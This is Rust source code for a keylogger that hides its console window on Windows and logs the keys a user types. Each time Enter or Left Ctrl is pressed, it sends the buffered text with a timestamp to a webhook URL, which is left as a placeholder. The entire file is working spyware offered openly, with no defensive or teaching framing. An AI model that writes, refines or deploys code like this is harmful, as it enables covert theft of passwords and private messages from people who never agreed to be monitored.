#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
use device_query::{DeviceQuery, DeviceState, Keycode};
use chrono::Local;
use std::{thread, time};
use reqwest::blocking::Client;
use serde_json::json;
//ur webhuk
const WEBHOOK_URL: &str = "webhookurl";

fn main() {
    let device_state = DeviceState::new();
    let mut last_keys = vec![];
    let mut key_buffer: Vec<String> = vec![];

    loop {
        let keys = device_state.get_keys();

        if keys != last_keys {
            for key in &keys {
                if !last_keys.contains(key) {
                    match key {
                        Keycode::Enter => {
                            if !key_buffer.is_empty() {
                                let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                                let text = key_buffer.join("");
                                let payload = format!("[{}] {}", now, text);
                                enviar_wehuk(&payload);
                                key_buffer.clear();
                            }
                        }
                        Keycode::Space => key_buffer.push(" ".to_string()),
                        Keycode::Backspace => {
                            key_buffer.pop();
                        }
                        Keycode::LControl => {
                            if !key_buffer.is_empty() {
                                let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                                let text = key_buffer.join("");
                                let payload = format!("[{}] {}", now, text);
                                enviar_wehuk(&payload);
                            }
                            return; // Termina el programa al presionar Ctrl
                        }
                        _ => {
                            let key_name = format!("{:?}", key);
                            if key_name.len() == 1 {
                                key_buffer.push(key_name);
                            }
                        }
                    }
                }
            }

            last_keys = keys;
        }

        thread::sleep(time::Duration::from_millis(50));
    }
}

fn enviar_wehuk(message: &str) {
    let client = Client::new();
    let payload = json!({ "content": message });

    let res = client.post(WEBHOOK_URL)
        .json(&payload)
        .send();

    if let Err(e) = res {
        eprintln!("Error al enviar webhook: {}", e);
    }
}
